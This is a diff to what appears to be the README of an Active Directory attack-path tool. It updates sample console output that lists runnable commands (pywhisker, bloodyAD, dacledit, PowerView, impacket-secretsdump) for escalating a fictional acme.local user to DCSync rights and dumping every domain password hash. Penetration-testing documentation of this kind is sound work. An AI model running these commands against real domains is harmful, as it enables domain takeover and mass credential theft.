@@ -116,13 +116,18 @@ Example console output (best path + summary; full breakdown lives in the HTML re
 
     # Step 1: GenericWrite on svc_backup@acme.local  (as john.doe@acme.local)
       $ pywhisker -d acme.local -u 'john.doe' -p '<SRC_PASSWORD>' --target 'svc_backup' --action add --dc-ip <DC_IP>
+      $ bloodyAD --host <DC_IP> -d acme.local -u 'john.doe' -p '<SRC_PASSWORD>' set object 'svc_backup' servicePrincipalName -v 'fake/blah'
       → now operating as: svc_backup@acme.local
 
     # Step 2: WriteDacl on acme.local  (as svc_backup@acme.local)
       $ dacledit.py -action write -rights DCSync -principal 'svc_backup' -target-dn 'DC=acme,DC=local' 'acme.local/svc_backup:<SRC_PASSWORD>' -dc-ip <DC_IP>
+      # PowerView (TargetIdentity = domain DN):
+      $ Add-DomainObjectAcl -TargetIdentity 'DC=acme,DC=local' -PrincipalIdentity 'svc_backup' -Rights DCSync -Credential $Cred
+      # Then dump all hashes:
       $ impacket-secretsdump -just-dc 'acme.local/svc_backup:<SRC_PASSWORD>@<DC_IP>'
 
     +2 more paths  →  see HTML report
+    10 intermediate target(s) reachable  →  see HTML report
 
   ◆ Best pivot: db_admin@acme.local (Kerberoast, 3 hops onward)
 
